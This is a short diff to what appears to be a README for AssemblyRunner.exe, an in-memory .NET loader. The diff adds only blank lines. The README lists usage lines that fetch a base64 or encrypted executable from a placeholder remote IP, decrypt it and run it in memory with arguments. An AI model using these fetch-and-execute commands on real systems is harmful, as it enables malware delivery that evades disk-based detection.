@@ -11,12 +11,15 @@ Functionality
 .Net Exe Run in-memory with Arguments:
 
 --Run remote .net exe (remote exe is b64 no encryption)
+
 AssemblyRunner.exe -net http://IP/File(b64) "Arguments"
 
 --Local .net exe File decrypt and run
+
 AssemblyRunner.exe -rlocal PASSWORD File_to_Decrypt_and_run "Arguments"
 
 --Remote .net File decrypt and run
+
 AssemblyRunner.exe -rdec PASSWORD http://IP/File "Arguments"
 
 
